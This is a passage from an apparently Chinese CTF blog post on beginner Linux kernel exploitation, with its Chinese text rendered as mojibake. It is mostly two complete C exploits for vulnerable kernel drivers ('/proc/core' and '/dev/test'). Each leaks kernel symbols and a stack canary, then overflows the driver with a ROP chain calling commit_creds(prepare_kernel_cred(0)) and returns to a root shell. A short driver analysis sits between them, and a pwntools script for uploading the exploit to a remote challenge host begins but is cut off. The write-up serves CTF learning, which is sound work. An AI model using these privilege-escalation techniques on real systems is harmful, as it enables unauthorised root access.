class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    set_off(fd, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    core_read(fd, buf);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br>    <br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>    &#125;<br>    rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = prepare_kernel_cred_addr;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx; </span><br>    rop[i++] = commit_creds_addr;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>    <br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>    <br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br>    <br>    write(fd, rop, <span class="hljs-number">0x800</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018coreROOT-1684501921223.png" alt="2018coreROOT"></p><h3 id="2023-catctf-kernel-test">2023 catctf kernel-test</h3><h4 id="0x1ä¿æŠ¤">0x1ä¿æŠ¤</h4><p>æ˜¾ç„¶ä¿æŠ¤åªå¼€å¯kaslrï¼Œä¸è¿‡æœ‰<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>ç™½ç»™å‡½æ•°åœ°å€</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/11-1684501192455.png" alt="11"></p><p>æ²¡æœ‰å¼€å¯smep/smap</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684501192455.png" alt="5"></p><p><code>cat /sys/devices/system/cpu/vulnerabilities/*</code>æ²¡æœ‰å¼€å¯KPTI</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684501192455.png" alt="6"></p><h4 id="0x2åˆ†æ">0x2åˆ†æ</h4><p>æƒ¯ä¾‹çœ‹æ¼æ´é©±åŠ¨<code>HRPKO.ko</code></p><p>initæ³¨å†Œè®¾å¤‡/dev/test</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684501192455.png" alt="7"></p><p>readè¯»ç‰¹å®šå†…å­˜ç»™ç”¨æˆ·ï¼Œå¯ç”¨æ¥æ³„éœ²canary</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684501192455.png" alt="8"></p><p>writeæŠŠç”¨æˆ·å†…å­˜è¯»åˆ°å†…æ ¸å…¨å±€å˜é‡pwn</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9-1684501192455.png" alt="9"></p><p>ioctlæŠŠå…¨å±€å˜é‡pwnæ‹·è´åˆ°leakï¼Œæ˜æ˜¾çš„æ ˆæº¢å‡º</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/10-1684501192455.png" alt="10"></p><h4 id="0x3æ€è·¯">0x3æ€è·¯</h4><p>åˆ°è¿™é‡Œæ€è·¯å°±å¾ˆæ˜æœ—äº†</p><p>è¯»å–æ–‡ä»¶/tmp/kallsymså¾—åˆ°commit_creds_addrï¼Œprepare_kernel_cred_addråœ°å€ï¼Œè¿‡kalsr</p><p>readæ³„éœ²canary</p><p>writeå†™ropåˆ°å…¨å±€å˜é‡pwn</p><p>ioctlæº¢å‡ºæ‰§è¡Œropï¼ˆret2usrå³å¯ï¼‰</p><h4 id="0x4Exp">0x4Exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00f50</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>        <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>        &#123;<br>            vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;  <br>    &#125;<br>     <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>&#123;<br>    saveStatus();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base<span class="hljs-number">-0x30350</span>;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/dev/test&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        errExit(<span class="hljs-string">&quot;open ko err&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    read(fd, buf,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">//printf(&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;,canary);</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">4</span>;i++)<br>        rop[i] = canary;<br><br>    rop[i++] = (<span class="hljs-type">size_t</span>)&amp;get_root;<br><br>    rop[i++] = swapgs_restore_regs_and_return_to_usermode+offset+<span class="hljs-number">22</span>;<br>    rop[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    <span class="hljs-comment">//rop[i++] = 0;</span><br><br>    rop[i++] = (<span class="hljs-type">size_t</span>)&amp;spawn_shell;         <span class="hljs-comment">// rip </span><br><br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br><br>    write(fd, rop, <span class="hljs-number">0x300</span>);<br>    ioctl(fd,<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="0x5ä¼ è¿œç«¯">0x5ä¼ è¿œç«¯</h4><p>åªæœ‰<code>/tmp</code>ç›®å½•ä¸‹å¯ä»¥ç”Ÿæˆæ–‡ä»¶å¥½åƒï¼Œ</p><p>æ”¾ä¸€å¼ å½“æ—¶æ‰“é€šçš„å›¾</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/12-1684501192455.png" alt="12"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time, os<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p = process(&#x27;./boot.sh&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;223.112.5.156&quot;</span>,<span class="hljs-number">60870</span>)<br><br>os.system(<span class="hljs-string">&quot;tar -czvf exp.tar.gz ./exploit&quot;</span>)<br>os.system(<span class="hljs-string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)<br><br>f 